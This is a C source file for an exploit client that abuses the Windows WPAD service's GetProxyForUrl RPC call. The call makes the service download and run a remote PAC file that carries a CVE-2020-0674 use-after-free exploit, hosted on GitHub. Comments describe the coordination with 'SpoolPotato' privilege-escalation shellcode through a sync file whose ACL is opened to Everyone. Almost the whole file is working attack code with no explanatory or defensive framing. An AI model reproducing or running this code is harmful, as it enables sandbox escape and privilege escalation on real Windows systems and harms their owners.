#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "IWinHttpAutoProxySvc_h.h"

#pragma comment(lib, "rpcrt4.lib")

BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);

////////
////////
// Global settings
////////

//#define DEBUG
//#define EXE_BUILD
#define DLL_BUILD
#define SHELLCODE_BUILD
#define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
#define SYNC_FOLDER L"C:\\ProgramData\\DoubleStarSync"
#define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"

////////
////////
// Debug logic
////////

#ifdef DEBUG
void DebugLog(const wchar_t* Format, ...) {
    va_list Args;
    static wchar_t* pBuffer = NULL;

    if (pBuffer == NULL) {
        pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
    }
    else {
        ZeroMemory(pBuffer, 10000 * 2);
    }

    va_start(Args, Format);
    wvsprintfW(pBuffer, Format, Args);
    va_end(Args);
#ifdef DLL_BUILD
    MessageBoxW(NULL, pBuffer, L"WPAD escape", 0);
#endif
#ifdef EXE_BUILD
    printf("%ws\r\n", pBuffer);
#endif
    //HeapFree(GetProcessHeap(), 0, pBuffer);
}
#endif

////////
////////
// RPC helpers
////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-allocate-function
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-free-function
    free(ptr);
}

////////
////////
// Primary WPAD RPC logic
////////

RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
    INT nReply = 0;
    uint32_t dwInt = 0;
    uint32_t dwWinHttpStatusCode = 0;
    RPC_WSTR StringBinding = NULL;
    RPC_STATUS RpcStatus = RPC_S_OK;
    RPC_BINDING_HANDLE hRpcBinding = NULL;
    HANDLE hNameResTrkRecord = NULL;
    uint32_t dwAutoConfigUrlLen = (wcslen(PacUrl) + 1) + 500;
    wchar_t* pAutoConfigUrl = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwAutoConfigUrlLen * 2);
    RPC_ASYNC_STATE RpcAsyncState = { 0 };
    tagProxyResolveUrl ProxyResolveUrl = { 0 };
    WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
    WINHTTP_SESSION_OPTIONS SessionOptions = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { 0 };

    // Make a unique variation of the specified PAC URL to avoid WPAD cache issues

    _snwprintf_s(pAutoConfigUrl, dwAutoConfigUrlLen, dwAutoConfigUrlLen, L"%ws?%lld", PacUrl, __rdtsc());
#ifdef DEBUG
    DebugLog(L"... target PAC URL: %ws", pAutoConfigUrl);
#endif
    // Create the configuration structs used in invoking the GetProxyForUrl method

    ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
    ProxyResolveUrl.Domain = L"www.google.com";
    ProxyResolveUrl.Seperator = L"/";
    ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
    ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB

    AutoProxyOptions.lpszAutoConfigUrl = pAutoConfigUrl;
    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;

    SessionOptions.dwMaxTimeout = 0xffffffff;
    SessionOptions.dwTimeout1 = 0x0000ea60; // seems like dwTimeout 60000 MS
    SessionOptions.Member2 = 0x00000005;    // maybe drift timeout
    SessionOptions.dwTimeout2 = 0x00007530;
    SessionOptions.dwTimeout3 = 0x00007530;
    SessionOptions.Member5 = 0x00000000;

    /* 
    The RPC call to WPAD follows a simple pattern:
       1. Create an RPC string binding handle on the ncalrpc protocol
       2. Generate an RPC_BINDING_HANDLE (to be used in all future operations) from the string binding handle
       3. Create an asynchronous RPC state handle which will be used for the actual call to GetProxyForUrl
       4. Make the RPC call to GetProxyForUrl within the WPAD service and wait for its completion via the event object in its RPC async handle
    */

    RpcStatus = RpcStringBindingComposeW(0, (RPC_WSTR)L"ncalrpc", 0, 0, 0, &StringBinding); // Create the initial RPC string binding handle over ncalrpc protocol

    if (RpcStatus == RPC_S_OK) {
        RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding); // Create the primary RPC binding handle

        if (RpcStatus == RPC_S_OK) {
            RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState)); // Initialize an asynchronous RPC state handle which will be used for the actual remote call GetProxyForUrl

            if (RpcStatus == RPC_S_OK) {
                RpcAsyncState.UserInfo = NULL;
                RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
                RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state

                RpcTryExcept {
#ifdef DEBUG
                    DebugLog(L"... calling GetProxyForUrl RPC method.");
#endif
                    GetProxyForUrl(
                        &RpcAsyncState,
                        hRpcBinding,
                        &ProxyResolveUrl,
                        &AutoProxyOptions,
                        &SessionOptions,
                        0,
                        NULL,
                        &dwInt,
                        &ProxyResult,
                        &hNameResTrkRecord,
                        &dwWinHttpStatusCode
                    );
                }
                RpcExcept(1) {
                    //RpcStatus = RpcExceptionCode();
#ifdef DEBUG
                    DebugLog(L"... GetProxyForUrl failed. Error: 0x%x", RpcExceptionCode());
#endif
                }
                RpcEndExcept

                uint32_t dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);
                
                if (RpcAsyncState.u.hEvent != NULL) { // Unclear why this would occur, perhaps the RPC server or OS may closed it autonomously?
                    CloseHandle(RpcAsyncState.u.hEvent);
                }
                
                if (dwWaitResult == WAIT_OBJECT_0) {
                    //RpcAsyncCompleteCall(&RpcAsyncState, &nReply); // This may crash with exception RPC_S_INTERNAL_ERROR in some cases. When repetition is needed it wrecks the exploit chain.
                }
                else {
#ifdef DEBUG
                    DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
#endif
                    RpcAsyncCancelCall(&RpcAsyncState, TRUE);
                }
            }
            else {
#ifdef DEBUG
                DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%x", RpcStatus);
#endif
            }

            RpcBindingFree(&hRpcBinding);
        }
        else {
#ifdef DEBUG
            DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%x", RpcStatus);
#endif
        }

        RpcStringFreeW(&StringBinding);
    }
    else {
#ifdef DEBUG
        DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%x", RpcStatus);
#endif
    }

    HeapFree(GetProcessHeap(), 0, pAutoConfigUrl);

    return RpcStatus;
}

#ifdef DLL_BUILD
BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
#ifdef SHELLCODE_BUILD
            /*
            SpoolPotato/WPAD client synchronization

            Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
            the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
            often yield a successful status from WPAD.

            To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
            attempt to trigger the PAC download until it receives confirmation via an event object from within
            the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
            the CVE-2020-0674 UAF.

            The WPAD client initially:
            1. Creates a sync event file/folder and then proceeds to repeatedly make RPC calls to WPAD in a loop
            2. Between each iteration of the loop it spends several seconds waiting for the signal file it
               previously created to be deleted by SpoolPotato.
            3. Once the event file has been deleted the WPAD client ends its loop and terminates.

            Meanwhile the SpoolPotato shellcode:
            1. Makes its privilege escalation operations.
            2. Waits for the sync event file to be created by the WPAD client.
            3. Deletes the event file to signal completion to the WPAD client.
            4. Terminates itself.
            */

            if (CreateDirectoryW(SYNC_FOLDER, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
                HANDLE hFile = CreateFileW(SYNC_FILE, GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);

                if (hFile != INVALID_HANDLE_VALUE) {
                    CloseHandle(hFile);
#ifdef DEBUG
                    DebugLog(L"... setting Everyone ACL on %ws", SYNC_FILE);
#endif
                    if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
#ifdef DEBUG
                        DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
#endif
                        while (TRUE) {
#ifdef DEBUG
                            DebugLog(L"... sending PAC update RPC signal to WPAD...");
#endif
                            RPC_STATUS RpcStatus = WpadInjectPac(TARGET_PAC_URL);
#ifdef DEBUG
                            DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
#endif
                            Sleep(3000);
                            hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

                            if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
                                DebugLog(L"... received sync signal from code within WPAD");
#endif
                                break;
                            }
                            else {
                                CloseHandle(hFile);
#ifdef DEBUG
                                DebugLog(L"... timed out waiting on sync signal from code within WPAD");
#endif
                            }
                        }
                    }
                    else {
#ifdef DEBUG
                        DebugLog(L"... failed to set Everyone ACL on file at %ws", SYNC_FILE);
#endif
                    }
                }
                else {
#ifdef DEBUG
                    DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
#endif
                }
            }
#else
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
#endif
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
#else
int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
    if (nArgc < 2) {
        DebugLog(L"... no PAC URL argument provided");
    }
    else {
        /*
        SpoolPotato/WPAD client synchronization

        Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
        the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
        often yield a successful status from WPAD.

        To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
        attempt to trigger the PAC download until it receives confirmation via an event object from within
        the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
        the CVE-2020-0674 UAF.

        The WPAD client initially:
        1. Creates a sync event file/folder and then proceeds to repeatedly make RPC calls to WPAD in a loop
        2. Between each iteration of the loop it spends several seconds waiting for the signal file it
           previously created to be deleted by SpoolPotato.
        3. Once the event file has been deleted the WPAD client ends its loop and terminates.

        Meanwhile the SpoolPotato shellcode:
        1. Makes its privilege escalation operations.
        2. Waits for the sync event file to be created by the WPAD client.
        3. Deletes the event file to signal completion to the WPAD client.
        4. Terminates itself.
        */

        if (CreateDirectoryW(SYNC_FOLDER, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
            HANDLE hFile = CreateFileW(SYNC_FILE, GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);

            if (hFile != INVALID_HANDLE_VALUE) {
                CloseHandle(hFile);

                if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
                    DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);

                    while (TRUE) {
                        DebugLog(L"... sending PAC update RPC signal to WPAD...");
                        RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
                        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
                        Sleep(3000);
                        hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

                        if (hFile == INVALID_HANDLE_VALUE) {
                            DebugLog(L"... received sync signal from code within WPAD");
                            break;
                        }
                        else {
                            CloseHandle(hFile);
                            DebugLog(L"... timed out waiting on sync signal from code within WPAD");
                        }
                    }
                }
                else {
                    DebugLog(L"... failed to set Everyone ACL on file at %ws", SYNC_FILE);
                }
            }
            else {
                DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
            }
        }
    }

    return 0;
}
#endif